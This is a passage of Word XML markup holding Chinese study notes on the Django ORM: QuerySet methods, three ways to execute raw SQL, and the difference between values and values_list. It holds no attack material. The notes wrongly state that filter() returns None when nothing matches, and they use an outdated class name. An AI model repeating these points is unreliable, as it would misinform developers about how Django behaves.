        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5260D8C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770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HomeView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>View</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EBEDED" w14:textId="06B11435"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A137DE7" w14:textId="1C56D697"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05</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列举</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django orm</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的所有方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AC3BF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&lt;1&gt; all():                 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>查询所有结果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58225AC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&lt;2&gt; filter(**kwargs):       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>它包含了与所给筛选条件相匹配的对象。获取不到返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794A9159"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&lt;3&gt; get(**kwargs):         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回与所给筛选条件相匹配的对象，返回结果有且只有一个。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AB5792"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果符合筛选条件的对象超过一个或者没有都会抛出错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AE21EE"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&lt;4&gt; exclude(**kwargs):     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>它包含了与所给筛选条件不匹配的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477EC076"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&lt;5&gt; order_by(*field):       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对查询结果排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7321800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&lt;6&gt; reverse():             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对查询结果反向排序</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174914F2"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&lt;8&gt; count():               </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回数据库中匹配查询</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(QuerySet)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的对象数量。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C99B01F"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&lt;9&gt; first():               </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回第一条记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FA3AEA"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&lt;10&gt; last():               </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回最后一条记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3656111E"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">&lt;11&gt; exists():             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>包含数据，就返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，否则返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67614CEC"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&lt;12&gt; values(*field):       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ValueQuerySet——</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>一个特殊的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，运行后得到的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E19DD78"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并不是一系</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的实例化对象，而是一个可迭代的字典序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3A8DE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&lt;13&gt; values_list(*field):   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>它与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>values()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>非常相似，它返回的是一个元组序列，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>values</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回的是一个字典序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D1FAD5" w14:textId="215237FC"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&lt;14&gt; distinct():           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>从返回结果中剔除重复纪录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0996740D" w14:textId="75DDEAB0"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07</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列举</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django orm</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中三种能写</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>语句的方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B260E9"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1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>执行自定义的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5364C4D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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>直接执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>语句（类似于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>pymysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的用法）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6772444A"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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>更高灵活度的方式执行原生</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521576F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from django.db import connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D05179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cursor = connection.cursor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D24192"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cursor.execute("SELECT DATE_FORMAT(create_time, '%Y-%m') FROM blog_article;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A8FBE3"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ret = cursor.fetchall()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03395403"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print(ret)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A86D71"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2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>extra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>queryset.extra(select={"key": "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>原生的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>语句</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06358227"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3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>raw</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10981B9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1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>执行原始</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并返回模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEED0F1" w14:textId="4DCEC63E"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2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>依赖</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>多用于查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D28C8F" w14:textId="23F44EA5"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008</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values</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>values_list</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F673013" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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values : queryset类型的列表中是字典</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AC38D9" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
